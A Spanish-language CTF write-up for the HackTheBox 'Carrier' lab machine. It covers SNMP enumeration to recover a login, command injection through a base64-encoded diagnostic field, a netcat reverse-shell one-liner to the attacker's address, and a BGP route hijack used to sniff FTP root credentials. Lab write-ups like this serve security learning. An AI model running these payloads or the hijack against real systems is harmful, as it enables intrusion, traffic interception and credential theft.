---
layout: single
title: Carrier HTB - WriteUp
excerpt: WriteUp de la máquina Carrier de HTB.
date: 2023-03-03
classes: wide
header:
  teaser: /assets/images/Carrier/Carrier.png
  teaser_home_page: true
  icon: /assets/images/Carrier/Carrier.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web-Enumeration                                                                                                                                                                                  
  - RCE                                                                                                                                                                                   
  - BGP-Hijack
---

En el día de hoy estaremos resolviendo la máquina Carrier de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.10.105.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web RCE](#web-rce)
3. [BGP Hijack](#bgp-hijack)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p22,80 10.10.10.105
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-03 18:35 CET
Nmap scan report for 10.10.10.105
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver que hay dos puertos abiertos y son el SSH y un servidor web. Si accedemos al servidor web podemos ver lo siguiente.

![](/assets/images/Carrier/img1.png)

Vemos un panel de login con errores numericos. De momento el panel no es vulnerable a inyecciones básicas, vamos a tratar de hacer fuzzing sobre la web.

```bash
❯ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.10.105/                                                                     
===============================================================                                                                                                                              
Gobuster v3.1.0                                                                                                                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                
===============================================================                                                                                                                              
[+] Url:                     http://10.10.10.105/                                                                                                                                            
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/03 18:40:20 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 310] [--> http://10.10.10.105/img/]
/tools                (Status: 301) [Size: 312] [--> http://10.10.10.105/tools/]
/doc                  (Status: 301) [Size: 310] [--> http://10.10.10.105/doc/]  
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.105/css/]  
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.105/js/]   
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.105/fonts/]
/debug                (Status: 301) [Size: 312] [--> http://10.10.10.105/debug/]
```

Podemos ver diferentes directorios, entre ellos los mas interesantes son /debug que muestra un phpinfo() y /doc que permite directory listing. En el podemos encontrar un pdf con los codigos de error que hemos visto en elapanel de login y un esquema de red.

![](/assets/images/Carrier/img2.png)

Un codigo de error llama bastante la atención, el panel tiene las credenciales por defecto:

![](/assets/images/Carrier/img3.png)

¿Estamos atacando algo que esta actuando como un router? Le hice un escaneo de puertos udp para ver si tenía el puerto snmp abierto... Hay veces que este puerto puede dar información sensible.

```bash
❯ nmap -sU -p 161 -oN UDPScan 10.10.10.105
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-03 18:49 CET
Nmap scan report for 10.10.10.105
Host is up (0.044s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp
```

Puede que esté abierto, vamos a extraer la información con snmpbulkwalk.

```bash
❯ snmpbulkwalk -Cr100 -c public -v2c 10.10.10.105 > snmpcontent
```

Si leemos snmpcontent podemos ver lo siguiente:

```bash
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Podemos ver un string, que podría ser la password del campo de login.  La contraseña para el usuario admin es: "NET_45JDX23"

Una vez dentro de la aplicación podemos ver un panel con tickets. En los cuales se habla sobre un reporte de un CVE, se nos da información sobre 3 redes que podrián ser sobre el diagrama de red anterior y que todo esta montado con BGP. Además un cliente tiene problemas para conectarse por FTP.

> El Border Gateway Protocol (BGP) **es un protocolo escalable de dynamic routing usado en la Internet por grupos de enrutadores para compartir información de enrutamiento**. BGP usa parámetros de ruta o atributos para definir políticas de enrutamiento y crear un entorno de enrutamiento estable.

También tenemos un boto de diagnostico que nos devuelve información de lo que parece ser procesos del sistema.

![](/assets/images/Carrier/img4.png)

### Web RCE

Dos procesos los estaría ejecutando "quagga" y el otro lo está ejecutando root.

> Quagga se compone de dos procesos: **Proceso Zebra: Es el que modificala tabla de enrutamiento del núcleo del sistema**. Proceso OSPF, RIP y/o BGP: Es el que le indica a Zebra qué modificaciones realizar en la tabla de enrutamiento.

Voy a pasar la petición del verify por burpsuite.

![](/assets/images/Carrier/img5.png)

La cadena que contiene check es base64 y decodeado es quagga. Voy a probar ejecutar comandos pasandole ";id #" encodeado en base64

![](/assets/images/Carrier/img6.png)

Tenemos RCE, vamos a establecernos una revshell. El payload que utilizaré es:

```bash
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f #
```

Si mandamos el payload encodeado en base64 y miramos nuestro listener podemos ver que tenemos una revshell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.10.105: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.105] 49750
/bin/sh: 0: can't access tty; job control turned off
#
```


### BGP Hijack

Si enumeramos la máquina podemos ver varias cosas, una curiosidad es que podemos ver nuestro comando inyectado:

```bash
root@r1:/# ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.2  37492  5796 ?        Ss   17:31   0:00 /sbin/init
root         54  0.0  0.1  35272  3528 ?        Ss   17:31   0:00 /lib/systemd/systemd-journald
root         62  0.0  0.1  41720  3128 ?        Ss   17:31   0:00 /lib/systemd/systemd-udevd
root        477  0.0  0.1  27728  2628 ?        Ss   17:31   0:00 /usr/sbin/cron -f
message+    478  0.0  0.1  42896  3504 ?        Ss   17:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        479  0.0  0.0   5220   116 ?        Ss   17:31   0:00 /sbin/iscsid
root        480  0.0  0.1   5720  3540 ?        SLs  17:31   0:00 /sbin/iscsid
root        483  0.0  0.2 274488  5760 ?        Ssl  17:31   0:00 /usr/lib/accountsservice/accounts-daemon
root        484  0.0  0.1  28544  2964 ?        Ss   17:31   0:00 /lib/systemd/systemd-logind
root        490  0.0  0.2  65508  4788 ?        Ss   17:31   0:00 /usr/sbin/sshd -D
daemon      493  0.0  0.0  26044  2008 ?        Ss   17:31   0:00 /usr/sbin/atd -f
root        494  0.0  1.2 214096 24568 ?        Ssl  17:31   0:00 /usr/lib/snapd/snapd
root        517  0.0  0.0  14472  1800 console  Ss+  17:31   0:00 /sbin/agetty --noclear --keep-baud console 115200 38400 9600 linux
root        528  0.0  0.2 277176  5780 ?        Ssl  17:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
quagga     1100  0.0  0.0  24500   608 ?        Ss   18:10   0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.1
quagga     1104  0.0  0.1  29444  3804 ?        Ss   18:10   0:00 /usr/lib/quagga/bgpd --daemon -A 127.0.0.1
root       1109  0.0  0.0  15432   168 ?        Ss   18:10   0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd
root       1112  0.0  0.2  36696  4204 ?        Ss   18:11   0:00 /lib/systemd/systemd --user
root       1113  0.0  0.0  60944  1632 ?        S    18:11   0:00 (sd-pam)
root       1284  0.0  0.3  92796  6924 ?        Ss   18:16   0:00 sshd: root@notty
root       1314  0.0  0.1  11236  3088 ?        Ss   18:16   0:00 bash -c ps waux | grep ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f # | grep -v grep
root       1319  0.0  0.0   6164   684 ?        S    18:16   0:00 cat /tmp/f
root       1320  0.0  0.0   4504   780 ?        S    18:16   0:00 /bin/sh -i
root       1321  0.0  0.0  11300  1652 ?        R    18:16   0:00 nc 10.10.16.6 443
root       1322  0.0  0.1  20760  2516 ?        S    18:16   0:00 script -c bash /dev/null
root       1323  0.0  0.1  19904  3768 pts/0    Ss   18:16   0:00 bash
root       1351  0.0  0.1  36084  3312 pts/0    R+   18:19   0:00 ps aux
```

Después si recordamos, un problema que tenía un cliente era que no podía acceder al FTP por tema de rutas. Lo mas probable es que tengamos que explotar un BGP Hijacking. Este post lo explica bastante bien https://hackinglethani.com/es/protocolo-bgp-i/ de hecho lo explica sobre esta misma máquina :)

Lo primero que haremos será ver un archivo que se encuentra en /opt que es /opt/restore.sh
el cual contiene lo siguiente:

```bash
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```

Esto esta mantando el servicio quagga y proceso vtysh (comando para conectarse a los demonios de quagga) y esta copiando los archivos de configuración originales por los que estan en uso. Por lo tanto vamos contra reloj. Yo lo que hice para que esto no pasará fue renombrar el script, de esta forma crontab no lo va a encontrar y no lo podrá ejecutar.

```bash
root@r1:/opt# mv restore.sh restore2.sh 
```

Hecho esto podemos continuar. Vamos a leer los archivos de configuración.

**zebra.conf**

```bash
root@r1:/opt# cat /etc/quagga/zebra.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
!
interface eth0
 no link-detect
 ipv6 nd suppress-ra
!
interface eth1
 no link-detect
 ipv6 nd suppress-ra
!
interface eth2
 no link-detect
 ipv6 nd suppress-ra
!
interface lo
 no link-detect
!
ip forwarding
!
!
line vty
!
```

Aquí podemos ver las interfaces de red que están en uso. Si hacemos un "ip a" podemos ver que las interfaces coinciden.

```bash
root@r1:/opt# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fed9:4ea/64 scope link 
       valid_lft forever preferred_lft forever
10: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe8a:f24f/64 scope link 
       valid_lft forever preferred_lft forever
12: eth2@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe20:98df/64 scope link 
       valid_lft forever preferred_lft forever

```


**bgp.conf**

```bash
root@r1:/opt# cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

Aquí podemos ver las rutas hacía los routers vecinos. Por eth1 nos podemos comunicar con la red 10.78.10.0 y por eth2 con 10.78.11.0

Ahora nos meteremos en la consola vtsysh, si habeis usado el Packet Tracert de CISCO esto  os será familiar.

```bash
root@r1:/opt# vtysh 

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1#
```

Vamos a ver la configuración actual.

```bash
r1# show running-config
Building configuration...

Current configuration:
!
!
interface eth0
 ipv6 nd suppress-ra
 no link-detect
!
interface eth1
 ipv6 nd suppress-ra
 no link-detect
!
interface eth2
 ipv6 nd suppress-ra
 no link-detect
!
interface lo
 no link-detect
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
ip forwarding
!
line vty
!
end
```

El BGP Hijacking se basa en el envenenamiento de las rutas. Tendremos que hacer que los equipos piensen que somos la ruta mas corta para llegar hasta sus destinos, en este caso al equipo del FTP para conseguir sus credenciales.

Sabiendo esto vamos a dejar unas ultimas cosas claras. Viendo la configuración podemos saber que nosotros estamos en el router AS100. Recordermos el esquema de red que teniamos.

![](/assets/images/Carrier/img2.png)

Vamos a ver nuestros vecinos bgp.

```bash
r1# show bgp neighbors                                                                                                                                                                       
BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link                                                                                                                       
  BGP version 4, remote router ID 10.255.255.2                                                                                                                                               
  BGP state = Established, up for 00:29:48                                                                                                                                                   
  Last read 00:00:48, hold time is 180, keepalive interval is 60 seconds                                                                                                                     
  Neighbor capabilities:                                                                                                                                                                     
    4 Byte AS: advertised and received                                                                                                                                                       
    Route refresh: advertised and received(old & new)                                                                                                                                        
    Address family IPv4 Unicast: advertised and received                                                                                                                                     
    Graceful Restart Capabilty: advertised and received                                                                                                                                      
      Remote Restart timer is 120 seconds                                                                                                                                                    
      Address families by peer:  

BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
  BGP version 4, remote router ID 10.255.255.3
  BGP state = Established, up for 00:29:49
  Last read 00:00:49, hold time is 180, keepalive interval is 60 seconds
  Neighbor capabilities:
    4 Byte AS: advertised and received
    Route refresh: advertised and received(old & new)
    Address family IPv4 Unicast: advertised and re
```

Podemos ver que nuestros "vecinos" son AS200 y AS300, como habiamos visto por las interfaces de red.

El servidor FTP que queremos interceptar está en **_10.120.15.0/24_** en el AS300. Actualmente, el tráfico salta de AS200 (cliente FTP) a AS300 (servidor FTP).

Para que el secuestro ocurra según lo previsto, debemos anunciar una red específica que no sea 10.120.15.0/24 en AS100 para que el tráfico se enrute hacia nosotros.

Vamos a configurar AS100:

Lo primero será entrar en el modo configuración, se puede hacer escribiendo "configure terminal"

```bash
r1# configure terminal 
r1(config)# 
```

Debemos decir que estamos en AS100

```bash
r1(config)# router bgp 100
r1(config-router)#
```

Ahora ya podemos configurar las rutas...  Ahora debemos añadir el rango de red que queremos ofrecer, en nuestro caso, 10.120.15.0/25

```bash
r1(config-router)# network 10.120.15.0/25
r1(config-router)#
```

Ahora tendremos que salvar los cambios de la siguiente forma:

```bash
r1(config-router)# exit
r1(config)# write
% Unknown command.
r1(config)# exit
r1# write
Building Configuration...
Configuration saved to /etc/quagga/zebra.conf
Configuration saved to /etc/quagga/bgpd.conf
[OK]
```

El siguiente paso es borrar las rutas y volver a anunciar la red de la siguiente forma:

```bash
r1# clear ip bgp * out
r1#
```

Para ver que realmente se han hecho los cambios podemos leer el archivo de configuración de bgp, el bgp.conf.

```bash
root@r1:/opt# cat /etc/quagga/bgpd.conf
!
! Zebra configuration saved from vty
!   2023/03/03 18:56:36
!
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 network 10.120.15.0/25
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
line vty
!
```

Podemos ver la red que hemos añadido anteriormente... Tambien podemos ver las rutas anunciadas en AS200, podemos ver que nuestra red /25 se ha agregado, y al ser la mas corta cogerá dicha red.

```bash
r1# clear ip bgp * out
r1# show  ip bgp  neighbors 10.78.10.2 advertised-routes 
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    10.78.10.1               0         32768 ?
*> 10.78.11.0/24    10.78.10.1               0         32768 ?
*> 10.99.64.0/24    10.78.10.1               0         32768 ?
*> 10.101.8.0/21    10.78.10.1               0         32768 i
*> 10.101.16.0/21   10.78.10.1               0         32768 i
*> 10.120.10.0/24   10.78.10.1                             0 300 i
*> 10.120.11.0/24   10.78.10.1                             0 300 i
*> 10.120.12.0/24   10.78.10.1                             0 300 i
*> 10.120.13.0/24   10.78.10.1                             0 300 i
*> 10.120.14.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/25   10.78.10.1               0         32768 i
*> 10.120.16.0/24   10.78.10.1                             0 300 i
*> 10.120.17.0/24   10.78.10.1                             0 300 i
*> 10.120.18.0/24   10.78.10.1                             0 300 i
*> 10.120.19.0/24   10.78.10.1                             0 300 i
*> 10.120.20.0/24   10.78.10.1                             0 300 i
*> 127.0.0.0        10.78.10.1               0         32768 ?

Total number of prefixes 18
r1#
```

Ahora tendremos que añadir la red a la interfaz eth2, podemos hacerlo de la siguiente forma:

```bash
root@r1:/opt# ip addr add 10.120.15.10/25 dev eth2
root@r1:/opt#
```

Ahora podemos usar herramientas como tsark o tcpdump para ver los paquetes de la red que esten pasando por eth2 y ver si capturamos las credenciales del FTP.

```bash
root@r1:/tmp# tcpdump -vv -i eth0 -w ftp.pcap port 21
```

Después de un rato podemos ver que nos llega información. 

```bash
root@r1:~# tcpdump -vv -s0 -ni eth2 -c 10 port 21
tcpdump: listening on eth2, link-type EN10MB (Ethernet), capture size 262144 bytes
[...]
13:53:01.528076 IP (tos 0x10, ttl 63, id 11657, offset 0, flags [DF], proto TCP (6), length 63)
    10.78.10.2.50692 > 10.120.15.10.21: Flags [P.], cksum 0x2e03 (incorrect -> 0x75af), seq 1:12
	USER root
[...]
13:53:01.528248 IP (tos 0x10, ttl 63, id 11658, offset 0, flags [DF], proto TCP (6), length 74)
    10.78.10.2.50692 > 10.120.15.10.21: Flags [P.], cksum 0x2e0e (incorrect -> 0xa290), seq 12:34
	PASS BGPtelc0rout1ng
```

Si probamos a loggernos con SSH podemos ver que las crendenciales son validas.

```bash
❯ ssh root@10.10.10.105
root@10.10.10.105´s password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  3 19:24:33 UTC 2023

  System load:  0.0               Users logged in:       0
  Usage of /:   63.6% of 8.73GB   IP address for ens160: 10.10.10.105
  Memory usage: 35%               IP address for lxdbr0: 10.99.64.1
  Swap usage:   0%                IP address for lxdbr1: 10.120.15.10
  Processes:    296


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.


Last login: Fri Sep 30 15:44:00 2022
root@carrier:~#
```

Espero que te haya servido! 
